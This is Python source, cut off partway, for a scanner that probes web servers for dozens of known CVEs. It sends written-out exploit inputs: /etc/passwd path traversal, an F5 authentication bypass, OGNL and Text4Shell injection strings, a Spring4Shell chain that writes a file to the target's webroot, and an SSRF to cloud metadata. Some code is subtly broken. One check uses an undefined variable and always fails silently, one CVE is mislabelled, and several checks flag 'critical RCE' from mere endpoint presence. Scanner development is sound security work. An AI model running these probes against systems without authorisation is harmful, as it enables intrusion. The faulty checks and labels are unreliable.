"""
CVE-Based Vulnerability Scanner

Tests for 50+ real-world CVEs across major enterprise products.
All checks send HTTP requests and analyze responses for indicators of vulnerability.
Every CVE here has been documented in the wild and is commonly tested during
penetration testing engagements.

Detection methods used:
  - Path-based: Request known vulnerable endpoints, check response indicators
  - Header-based: Inject malicious headers, check for reflection/behavior change
  - Time-based: Send payloads that cause measurable delays if vulnerable
  - Content-based: Check response bodies for sensitive data leakage
"""

import re
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse

from utils.logger import get_logger

logger = get_logger(__name__)


class CVEScanner:
    """Scanner for real-world CVEs with HTTP-based detection."""

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.scanner_config = config.get('vulnerability_scanner', {})
        self.timeout = config.get('scanner', {}).get('timeout', 10)

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Run all CVE-based checks against the target URL.

        Args:
            url: Target URL
            context: Optional scan context

        Returns:
            List of vulnerability dictionaries
        """
        vulnerabilities = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # F5 BIG-IP CVEs
        vulnerabilities.extend(self._check_cve_2020_5902(base_url))
        vulnerabilities.extend(self._check_cve_2021_22986(base_url))
        vulnerabilities.extend(self._check_cve_2022_1388(base_url))

        # Apache Struts CVEs
        vulnerabilities.extend(self._check_cve_2017_5638(url))
        vulnerabilities.extend(self._check_cve_2017_9805(base_url))
        vulnerabilities.extend(self._check_cve_2018_11776(url))
        vulnerabilities.extend(self._check_cve_2019_0230(url))

        # Atlassian CVEs
        vulnerabilities.extend(self._check_cve_2022_26134(url))
        vulnerabilities.extend(self._check_cve_2021_26084(url))
        vulnerabilities.extend(self._check_cve_2019_3396(base_url))
        vulnerabilities.extend(self._check_cve_2019_8451(url))
        vulnerabilities.extend(self._check_cve_2019_11581(url))
        vulnerabilities.extend(self._check_cve_2020_14179(url))

        # Oracle WebLogic CVEs
        vulnerabilities.extend(self._check_cve_2017_10271(base_url))
        vulnerabilities.extend(self._check_cve_2020_14882(base_url))
        vulnerabilities.extend(self._check_cve_2020_14883(base_url))

        # Apache / Spring CVEs
        vulnerabilities.extend(self._check_cve_2022_22965(url))
        vulnerabilities.extend(self._check_cve_2022_42889(url))
        vulnerabilities.extend(self._check_cve_2020_1938(base_url))
        vulnerabilities.extend(self._check_cve_2017_12629(base_url))
        vulnerabilities.extend(self._check_cve_2019_0193(base_url))
        vulnerabilities.extend(self._check_cve_2019_12409(base_url))
        vulnerabilities.extend(self._check_cve_2020_17518(base_url))
        vulnerabilities.extend(self._check_cve_2020_17519(base_url))

        # PHP / Web Apps CVEs
        vulnerabilities.extend(self._check_cve_2017_9841(base_url))
        vulnerabilities.extend(self._check_cve_2018_7600(url))
        vulnerabilities.extend(self._check_cve_2018_7602(url))
        vulnerabilities.extend(self._check_cve_2019_16759(base_url))
        vulnerabilities.extend(self._check_cve_2018_15961(base_url))

        # VPN / Appliance CVEs
        vulnerabilities.extend(self._check_cve_2019_11510(base_url))
        vulnerabilities.extend(self._check_cve_2019_19781(base_url))
        vulnerabilities.extend(self._check_cve_2020_8191(base_url))
        vulnerabilities.extend(self._check_cve_2020_3452(base_url))
        vulnerabilities.extend(self._check_cve_2018_0296(base_url))
        vulnerabilities.extend(self._check_cve_2018_13379(base_url))

        # Microsoft Exchange CVEs
        vulnerabilities.extend(self._check_cve_2021_26855(base_url))
        vulnerabilities.extend(self._check_cve_2021_34473(base_url))
        vulnerabilities.extend(self._check_cve_2020_0688(base_url))
        vulnerabilities.extend(self._check_cve_2021_31207(base_url))

        # Java App Server CVEs
        vulnerabilities.extend(self._check_cve_2017_7504(base_url))
        vulnerabilities.extend(self._check_cve_2017_12149(base_url))
        vulnerabilities.extend(self._check_cve_2018_1000861(base_url))
        vulnerabilities.extend(self._check_cve_2017_1000353(base_url))

        # Shell / Rails / Other
        vulnerabilities.extend(self._check_cve_2014_6271(base_url))
        vulnerabilities.extend(self._check_cve_2019_5418(url))
        vulnerabilities.extend(self._check_cve_2018_3760(url))
        vulnerabilities.extend(self._check_cve_2018_19965(base_url))
        vulnerabilities.extend(self._check_cve_2021_21234(base_url))
        vulnerabilities.extend(self._check_cve_2019_11043(base_url))

        # WordPress CVEs & Common Issues
        vulnerabilities.extend(self._check_wp_user_enum(base_url))
        vulnerabilities.extend(self._check_wp_xmlrpc(base_url))
        vulnerabilities.extend(self._check_wp_debug_log(base_url))
        vulnerabilities.extend(self._check_wp_install(base_url))
        vulnerabilities.extend(self._check_wp_backups(base_url))
        vulnerabilities.extend(self._check_cve_2021_29447(base_url))
        vulnerabilities.extend(self._check_cve_2020_11738(base_url))
        vulnerabilities.extend(self._check_cve_2017_5486(base_url))

        # Laravel CVEs
        vulnerabilities.extend(self._check_cve_2021_3129(base_url))
        vulnerabilities.extend(self._check_cve_2018_15133(base_url))
        vulnerabilities.extend(self._check_cve_2017_16894(base_url))
        vulnerabilities.extend(self._check_laravel_debug(base_url))

        # Apache Tomcat CVEs
        vulnerabilities.extend(self._check_cve_2019_0232(base_url))
        vulnerabilities.extend(self._check_cve_2020_9484(base_url))
        vulnerabilities.extend(self._check_cve_2021_25329(base_url))
        vulnerabilities.extend(self._check_cve_2019_0221(base_url))
        vulnerabilities.extend(self._check_cve_2018_11759(base_url))
        vulnerabilities.extend(self._check_tomcat_manager(base_url))
        vulnerabilities.extend(self._check_cve_2018_8037(base_url))

        # More Jira CVEs
        vulnerabilities.extend(self._check_cve_2020_14178(base_url))
        vulnerabilities.extend(self._check_cve_2021_26065(base_url))
        vulnerabilities.extend(self._check_cve_2022_0540(base_url))
        vulnerabilities.extend(self._check_cve_2022_26135(base_url))

        # More Spring CVEs
        vulnerabilities.extend(self._check_cve_2018_1273(url))
        vulnerabilities.extend(self._check_cve_2016_4977(url))
        vulnerabilities.extend(self._check_cve_2017_4971(url))
        vulnerabilities.extend(self._check_cve_2016_1000027(base_url))

        # More Oracle WebLogic CVEs
        vulnerabilities.extend(self._check_cve_2020_14750(base_url))
        vulnerabilities.extend(self._check_cve_2020_14645(base_url))
        vulnerabilities.extend(self._check_cve_2019_2729(base_url))

        # phpMyAdmin CVEs
        vulnerabilities.extend(self._check_cve_2018_12613(base_url))
        vulnerabilities.extend(self._check_cve_2018_19968(base_url))
        vulnerabilities.extend(self._check_cve_2017_11582(base_url))
        vulnerabilities.extend(self._check_phpmyadmin_accessible(base_url))

        # General Web Security Checks
        vulnerabilities.extend(self._check_cve_2019_6340(base_url))
        vulnerabilities.extend(self._check_cve_2020_15070(base_url))
        vulnerabilities.extend(self._check_grafana_access(base_url))
        vulnerabilities.extend(self._check_kibana_access(base_url))
        vulnerabilities.extend(self._check_git_exposed(base_url))
        vulnerabilities.extend(self._check_dotenv_exposed(base_url))
        vulnerabilities.extend(self._check_directory_listing(base_url))
        vulnerabilities.extend(self._check_admin_panels(base_url))

        return vulnerabilities

    # =========================================================================
    # F5 BIG-IP CVEs
    # =========================================================================

    def _check_cve_2020_5902(self, base_url: str) -> List[Dict]:
        """CVE-2020-5902: F5 BIG-IP TMUI RCE via path traversal."""
        vulnerabilities = []
        path = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'root:x:0:0' in resp.text or 'nobody:x:' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-5902 - F5 BIG-IP TMUI RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': '/etc/passwd content retrieved via path traversal',
                        'cve_references': ['CVE-2020-5902'],
                        'description': 'F5 BIG-IP Traffic Management User Interface (TMUI) '
                                       'has an unauthenticated RCE via path traversal in the '
                                       '/tmui/login.jsp endpoint',
                        'remediation': 'Upgrade BIG-IP to patched version (16.0.0.1+, 15.1.0.5+, '
                                       '14.1.2.7+, 13.1.3.5+, 12.1.5.2+, 11.6.5.2+)',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-5902 error: {e}")
        return vulnerabilities

    def _check_cve_2021_22986(self, base_url: str) -> List[Dict]:
        """CVE-2021-22986: F5 BIG-IP iControl REST unauthenticated RCE."""
        vulnerabilities = []
        path = "/mgmt/shared/authn/login"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'token' in resp.text and 'selfLink' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2021-22986 - F5 BIG-IP iControl REST RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'iControl REST API exposed without authentication',
                        'cve_references': ['CVE-2021-22986'],
                        'description': 'F5 BIG-IP iControl REST API is exposed without '
                                       'authentication, allowing unauthenticated RCE',
                        'remediation': 'Upgrade BIG-IP to patched version '
                                       '(16.0.1.1+, 15.1.2.1+, 14.1.4.1+, 13.1.3.6+, 12.1.5.3+)',
                    })
        except Exception as e:
            logger.debug(f"CVE-2021-22986 error: {e}")

        # Also check iControl REST API access
        path2 = "/mgmt/tm/ltm/virtual"
        url2 = urljoin(base_url, path2)
        try:
            resp = self.http_client.get(url2, timeout=self.timeout)
            if resp and resp.status_code == 200 and 'items' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2021-22986 - F5 BIG-IP iControl REST (LTM Access)',
                    'severity': 'critical',
                    'url': url2,
                    'evidence': 'LTM virtual server config exposed without auth',
                    'cve_references': ['CVE-2021-22986'],
                    'description': 'BIG-IP iControl REST LTM API accessible without authentication',
                    'remediation': 'Upgrade BIG-IP and restrict iControl REST access',
                })
        except Exception as e:
            logger.debug(f"CVE-2021-22986 iControl error: {e}")

        return vulnerabilities

    def _check_cve_2022_1388(self, base_url: str) -> List[Dict]:
        """CVE-2022-1388: F5 BIG-IP iControl REST unauthenticated RCE bypass."""
        vulnerabilities = []
        path = "/mgmt/shared/authn/login"
        url = urljoin(base_url, path)
        try:
            headers = {
                'Host': 'localhost',
                'X-Forwarded-For': '127.0.0.1',
                'Connection': 'keep-alive, X-Foo',
                'Content-Type': 'application/json',
            }
            resp = self.http_client.post(
                url,
                json={"username": "admin", "password": "admin", "loginProviderName": "tmsh"},
                headers=headers,
                timeout=self.timeout,
            )
            if resp and resp.status_code in (200, 401):
                if 'token' in resp.text or 'generation' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2022-1388 - F5 BIG-IP iControl REST Auth Bypass',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Authentication bypass using Host: localhost header',
                        'cve_references': ['CVE-2022-1388'],
                        'description': 'F5 BIG-IP iControl REST has an authentication bypass '
                                       'via the Host header manipulation',
                        'remediation': 'Upgrade BIG-IP to patched version (16.1.2.2+, 15.1.5.1+, '
                                       '14.1.4.6+, 13.1.5+)',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-1388 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Apache Struts CVEs
    # =========================================================================

    def _check_cve_2017_5638(self, url: str) -> List[Dict]:
        """CVE-2017-5638: Apache Struts2 S2-045 RCE via Content-Type."""
        vulnerabilities = []
        try:
            headers = {
                'Content-Type': "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
                               ".addHeader('X-Test', 'S2-045')}.multipart/form-data"
            }
            resp = self.http_client.get(url, headers=headers, timeout=self.timeout)
            if resp and resp.headers.get('X-Test') == 'S2-045':
                vulnerabilities.append({
                    'type': 'CVE-2017-5638 - Apache Struts2 S2-045 RCE',
                    'severity': 'critical',
                    'url': url,
                    'parameter': 'Content-Type',
                    'evidence': 'OGNL execution via Content-Type header reflected in X-Test header',
                    'cve_references': ['CVE-2017-5638'],
                    'description': 'Apache Struts2 is vulnerable to RCE via crafted '
                                   'Content-Type header (S2-045)',
                    'remediation': 'Upgrade Struts2 to 2.3.32+ or 2.5.10.1+',
                })
        except Exception as e:
            logger.debug(f"CVE-2017-5638 error: {e}")
        return vulnerabilities

    def _check_cve_2017_9805(self, base_url: str) -> List[Dict]:
        """CVE-2017-9805: Apache Struts2 S2-052 RCE via REST plugin."""
        vulnerabilities = []
        path = "/struts/rest/helloWorld"
        url = urljoin(base_url, path)
        try:
            payload = """<xml>
                <person>
                    <firstName>test</firstName>
                    <lastName>test</lastName>
                </person>
            </xml>"""
            resp = self.http_client.post(url, data=payload,
                                         headers={'Content-Type': 'application/xml'},
                                         timeout=self.timeout)
            if resp and resp.status_code in (200, 500):
                if 'firstName' in resp.text or 'java.lang' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2017-9805 - Apache Struts2 S2-052 RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'REST plugin endpoint returns XML content',
                        'cve_references': ['CVE-2017-9805'],
                        'description': 'Apache Struts2 REST plugin deserialization RCE (S2-052)',
                        'remediation': 'Upgrade Struts2 to 2.5.13+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-9805 error: {e}")

        # Also check for Struts2 REST endpoints
        rest_paths = ['/struts/', '/struts/rest/', '/rest/', '/actions/']
        for rp in rest_paths:
            try:
                test_url = urljoin(base_url, rp)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and (resp.status_code in (200, 401, 403)):
                    if 'struts' in resp.text.lower() or 'action' in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'CVE-2017-9805 - Apache Struts2 REST Endpoint',
                            'severity': 'high',
                            'url': test_url,
                            'evidence': f'Struts REST endpoint found at {rp}',
                            'cve_references': ['CVE-2017-9805'],
                            'description': 'Apache Struts2 REST plugin endpoint detected',
                            'remediation': 'Upgrade Struts2 to 2.5.13+',
                        })
                        break
            except Exception:
                pass
        return vulnerabilities

    def _check_cve_2018_11776(self, url: str) -> List[Dict]:
        """CVE-2018-11776: Apache Struts2 S2-032 RCE via redirect namespace."""
        vulnerabilities = []
        try:
            test_url = url + "${233*233}"
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and '54289' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2018-11776 - Apache Struts2 S2-032 RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'OGNL expression ${233*233} evaluated to 54289 in response',
                    'cve_references': ['CVE-2018-11776'],
                    'description': 'Apache Struts2 RCE via OGNL injection in redirect namespace',
                    'remediation': 'Upgrade Struts2 to 2.3.35+ or 2.5.17+',
                })
        except Exception as e:
            logger.debug(f"CVE-2018-11776 error: {e}")
        return vulnerabilities

    def _check_cve_2019_0230(self, url: str) -> List[Dict]:
        """CVE-2019-0230: Apache Struts2 S2-RCE via OGNL."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            params = f"?({newstyle}={233*233})" if hasattr(self, '__dict__') else ""
            test_url = url.rstrip('/') + "/${233*233}/action"
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and '54289' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2019-0230 - Apache Struts2 S2-RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'OGNL expression evaluated in URL path',
                    'cve_references': ['CVE-2019-0230'],
                    'description': 'Apache Struts2 RCE via OGNL injection in URL path',
                    'remediation': 'Upgrade Struts2 to 2.5.22+',
                })
        except Exception as e:
            logger.debug(f"CVE-2019-0230 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Atlassian CVEs
    # =========================================================================

    def _check_cve_2022_26134(self, url: str) -> List[Dict]:
        """CVE-2022-26134: Atlassian Confluence OGNL RCE."""
        vulnerabilities = []
        try:
            check_url = url.rstrip('/') + "/${233*233}/"
            resp = self.http_client.get(check_url, timeout=self.timeout)
            if resp:
                if '54289' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2022-26134 - Atlassian Confluence OGNL RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'OGNL expression ${233*233} evaluated to 54289 in response',
                        'cve_references': ['CVE-2022-26134'],
                        'description': 'Atlassian Confluence Server/Data Center RCE '
                                       'via OGNL injection',
                        'remediation': 'Upgrade Confluence to 7.4.17+, 7.13.7+, '
                                       '7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-26134 error: {e}")
        return vulnerabilities

    def _check_cve_2021_26084(self, url: str) -> List[Dict]:
        """CVE-2021-26084: Atlassian Confluence OGNL RCE."""
        vulnerabilities = []
        try:
            check_url = url.rstrip('/') + "/pages/createpage.action?spaceKey=233*233"
            resp = self.http_client.get(check_url, timeout=self.timeout)
            if resp and '54289' in resp.text:
                vulnerabilities.append({
                    'type': 'CVE-2021-26084 - Atlassian Confluence OGNL RCE',
                    'severity': 'critical',
                    'url': url,
                    'evidence': 'OGNL expression via spaceKey reflected in response',
                    'cve_references': ['CVE-2021-26084'],
                    'description': 'Atlassian Confluence Server/Data Center RCE '
                                   'via OGNL injection in spaceKey parameter',
                    'remediation': 'Upgrade Confluence to 7.4.10+, 7.11.6+, 7.12.5+, 7.13.0+',
                })
        except Exception as e:
            logger.debug(f"CVE-2021-26084 error: {e}")
        return vulnerabilities

    def _check_cve_2019_3396(self, base_url: str) -> List[Dict]:
        """CVE-2019-3396: Atlassian Confluence SSTI RCE."""
        vulnerabilities = []
        path = "/rest/tinymce/1/macro/preview"
        url = urljoin(base_url, path)
        try:
            payload = {
                "contentId": "1",
                "macro": {
                    "name": "widget",
                    "params": {
                        "url": "https://www.example.com",
                        "width": "1000",
                        "height": "1000",
                        "_template": "http://example.com/test"
                    },
                    "body": ""
                }
            }
            resp = self.http_client.post(
                url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=self.timeout,
            )
            if resp and resp.status_code in (200, 500):
                if 'java.lang' in resp.text or 'widget' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-3396 - Atlassian Confluence SSTI RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Confluence widget connector SSTI endpoint accessible',
                        'cve_references': ['CVE-2019-3396'],
                        'description': 'Atlassian Confluence Server/Data Center SSTI RCE '
                                       'via widget connector macro',
                        'remediation': 'Upgrade Confluence to 6.6.13+, 6.12.4+, 6.13.4+, '
                                       '6.14.3+, 6.15.2+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-3396 error: {e}")
        return vulnerabilities

    def _check_cve_2019_8451(self, url: str) -> List[Dict]:
        """CVE-2019-8451: Jira SSRF via plugin."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            plugin_path = "/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/"
            test_url = urljoin(base, plugin_path)
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'ami-id' in resp.text or 'instance-id' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2019-8451 - Jira SSRF',
                        'severity': 'high',
                        'url': test_url,
                        'evidence': 'SSRF via makeRequest gadget returned cloud metadata',
                        'cve_references': ['CVE-2019-8451'],
                        'description': 'Jira Server/Data Center SSRF via the '
                                       'gadgets/makeRequest plugin',
                        'remediation': 'Upgrade Jira to 7.13.9+, 8.1.0+, 8.2.2+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-8451 error: {e}")
        return vulnerabilities

    def _check_cve_2019_11581(self, url: str) -> List[Dict]:
        """CVE-2019-11581: Jira template injection."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/secure/ContactAdministrators.jspa"
            test_url = urljoin(base, path)
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'contactadministrators' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2019-11581 - Jira Template Injection',
                        'severity': 'critical',
                        'url': test_url,
                        'evidence': 'ContactAdministrators.jspa endpoint accessible',
                        'cve_references': ['CVE-2019-11581'],
                        'description': 'Jira Server/Data Center template injection RCE '
                                       'via ContactAdministrators.jspa with crafted email',
                        'remediation': 'Upgrade Jira to 7.6.14+, 7.7.5+, 7.8.5+, '
                                       '7.9.3+, 7.10.3+, 7.11.3+, 7.12.3+, 7.13.1+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2019-11581 error: {e}")
        return vulnerabilities

    def _check_cve_2020_14179(self, url: str) -> List[Dict]:
        """CVE-2020-14179: Jira path traversal."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = "/s/thiscanbeanything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties"
            test_url = urljoin(base, path)
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'atlassian-jira' in resp.text or 'version' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-14179 - Jira Path Traversal',
                        'severity': 'high',
                        'url': test_url,
                        'evidence': 'Jira Maven pom.properties accessible via path traversal',
                        'cve_references': ['CVE-2020-14179'],
                        'description': 'Jira Server/Data Center path traversal via '
                                       'project bundle resources',
                        'remediation': 'Upgrade Jira to 7.13.6+, 8.5.1+, 8.6.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14179 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Oracle WebLogic CVEs
    # =========================================================================

    def _check_cve_2017_10271(self, base_url: str) -> List[Dict]:
        """CVE-2017-10271: Oracle WebLogic WLS RCE."""
        vulnerabilities = []
        path = "/wls-wsat/CoordinatorPortType"
        url = urljoin(base_url, path)
        try:
            payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                <soapenv:Header>
                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                        <java><void class="java.lang.String"><string>test</string></void></java>
                    </work:WorkContext>
                </soapenv:Header>
                <soapenv:Body/>
            </soapenv:Envelope>"""
            resp = self.http_client.post(
                url, data=payload,
                headers={'Content-Type': 'text/xml'},
                timeout=self.timeout,
            )
            if resp and resp.status_code in (200, 500, 401):
                if 'java.lang' in resp.text or 'faultstring' in resp.text or 'WorkContext' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2017-10271 - Oracle WebLogic WLS RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic WLS endpoint responds to SOAP requests',
                        'cve_references': ['CVE-2017-10271'],
                        'description': 'Oracle WebLogic Server WLS Security component '
                                       'deserialization RCE',
                        'remediation': 'Apply Oracle Critical Patch Update or remove '
                                       'wls-wsat component',
                    })
        except Exception as e:
            logger.debug(f"CVE-2017-10271 error: {e}")

        alt_paths = ['/wls-wsat/', '/_async/AsyncResponseService', '/_async/AsyncResponseServiceSoap12']
        for ap in alt_paths:
            try:
                test_url = urljoin(base_url, ap)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code != 404:
                    if 'weblogic' in resp.text.lower() or 'wls' in resp.text.lower():
                        vulnerabilities.append({
                            'type': 'CVE-2017-10271 - WebLogic WLS Endpoint',
                            'severity': 'high',
                            'url': test_url,
                            'evidence': f'WebLogic WLS endpoint accessible at {ap}',
                            'cve_references': ['CVE-2017-10271'],
                            'description': 'WebLogic WLS endpoint detected - may be vulnerable to deserialization RCE',
                            'remediation': 'Remove wls-wsat component or apply CPU patch',
                        })
            except Exception:
                pass
        return vulnerabilities

    def _check_cve_2020_14882(self, base_url: str) -> List[Dict]:
        """CVE-2020-14882: Oracle WebLogic Console RCE."""
        vulnerabilities = []
        path = "/console/css/%252e%252e%252fconsole.portal"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'console' in resp.text.lower() or 'WebLogic' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-14882 - Oracle WebLogic Console RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic console accessible without auth via path traversal',
                        'cve_references': ['CVE-2020-14882'],
                        'description': 'Oracle WebLogic Server console authentication bypass '
                                       'via path traversal',
                        'remediation': 'Apply Oracle Critical Patch Update October 2020',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14882 error: {e}")
        return vulnerabilities

    def _check_cve_2020_14883(self, base_url: str) -> List[Dict]:
        """CVE-2020-14883: Oracle WebLogic Console RCE via handle."""
        vulnerabilities = []
        path = "/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 500):
                if 'java.lang' in resp.text or 'FileSystemXmlApplicationContext' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2020-14883 - Oracle WebLogic Console RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'WebLogic console handle parameter allows arbitrary class loading',
                        'cve_references': ['CVE-2020-14883'],
                        'description': 'Oracle WebLogic Server console RCE via handle parameter',
                        'remediation': 'Apply Oracle Critical Patch Update October 2020',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-14883 error: {e}")
        return vulnerabilities

    # =========================================================================
    # Apache / Spring CVEs
    # =========================================================================

    def _check_cve_2022_22965(self, url: str) -> List[Dict]:
        """CVE-2022-22965: Spring4Shell RCE."""
        vulnerabilities = []
        try:
            parsed = urlparse(url)
            params = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1"
            test_url = f"{parsed.scheme}://{parsed.netloc}/spring4shell?" + params
            headers = {'c2': 'test'}
            resp = self.http_client.get(test_url, headers=headers, timeout=self.timeout)
            if resp:
                check_url = f"{parsed.scheme}://{parsed.netloc}/spring4shell.txt"
                resp2 = self.http_client.get(check_url, timeout=self.timeout)
                if resp2 and resp2.status_code == 200:
                    vulnerabilities.append({
                        'type': 'CVE-2022-22965 - Spring4Shell RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Spring Framework class injection - file written to webroot',
                        'cve_references': ['CVE-2022-22965'],
                        'description': 'Spring Framework RCE via class.module accessor injection',
                        'remediation': 'Upgrade Spring Framework to 5.3.18+ or 5.2.20+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-22965 error: {e}")
        return vulnerabilities

    def _check_cve_2022_42889(self, url: str) -> List[Dict]:
        """CVE-2022-42889: Text4Shell RCE (Apache Commons Text)."""
        vulnerabilities = []
        try:
            test_url = url + "${script:javascript:java.lang.Runtime.getRuntime().exec('test')}"
            resp = self.http_client.get(test_url, timeout=self.timeout)
            if resp and resp.status_code in (500, 200):
                if 'script' in resp.text.lower() or 'javax.script' in resp.text:
                    vulnerabilities.append({
                        'type': 'CVE-2022-42889 - Text4Shell RCE',
                        'severity': 'critical',
                        'url': url,
                        'evidence': 'Apache Commons Text interpolation reflected in response',
                        'cve_references': ['CVE-2022-42889'],
                        'description': 'Apache Commons Text RCE via variable interpolation',
                        'remediation': 'Upgrade commons-text to 1.10.0+',
                    })
        except Exception as e:
            logger.debug(f"CVE-2022-42889 error: {e}")
        return vulnerabilities

    def _check_cve_2020_1938(self, base_url: str) -> List[Dict]:
        """CVE-2020-1938: Ghostcat - Apache Tomcat AJP file read."""
        vulnerabilities = []
        path = "/examples/jsp/tsc/tsc.jsp"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code == 200:
                if 'tomcat' in resp.text.lower() or 'jakarta' in resp.text.lower():
                    vulnerabilities.append({
                        'type': 'CVE-2020-1938 - Ghostcat (Tomcat AJP)',
                        'severity': 'high',
                        'url': url,
                        'evidence': 'Apache Tomcat with AJP connector detected',
                        'cve_references': ['CVE-2020-1938'],
                        'description': 'Apache Tomcat AJP connector may be vulnerable to '
                                       'Ghostcat file read (CVE-2020-1938). Check AJP port (8009) '
                                       'for unauthenticated access.',
                        'remediation': 'Upgrade Tomcat to 7.0.100+, 8.5.51+, 9.0.31+, '
                                       'or disable/secure AJP connector',
                    })
        except Exception as e:
            logger.debug(f"CVE-2020-1938 error: {e}")
        return vulnerabilities

    def _check_cve_2017_12629(self, base_url: str) -> List[Dict]:
        """CVE-2017-12629: Apache Solr RCE via config."""
        vulnerabilities = []
        paths = ['/solr/admin/cores', '/solr/admin/', '/solr/#/', '/solr']
        for p in paths:
            try:
                test_url = urljoin(base_url, p)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                if resp and resp.status_code == 200:
                    if 'solr' in resp.text.lower() or 'SolrCore' in resp.text or 'Apache Solr' in resp.text:
                        vulnerabilities.append({
                            'type': 'CVE-2017-12629 - Apache Solr RCE',
                            'severity': 'critical',
                            'url': test_url,
                            'evidence': 'Apache Solr admin interface accessible',
                            'cve_references': ['CVE-2017-12629'],
                            'description': 'Apache Solr RCE via config API with crafted '
                                           'params.resource.loader.enabled',
                            'remediation': 'Upgrade Solr to 7.1.0+, restrict admin access',
                        })
                        break
            except Exception as e:
                logger.debug(f"CVE-2017-12629 error: {e}")
        return vulnerabilities

    def _check_cve_2019_0193(self, base_url: str) -> List[Dict]:
        """CVE-2019-0193: Apache Solr DataImportHandler RCE."""
        vulnerabilities = []
        path = "/solr/collection1/dataimport"
        url = urljoin(base_url, path)
        try:
            resp = self.http_client.get(url, timeout=self.timeout)
            if resp and resp.status_code in (200, 401, 403):
                if 'dataimport' in resp.text.lower() or 'DataImportHandler' in resp.text:
                    vulnerabilities.append({
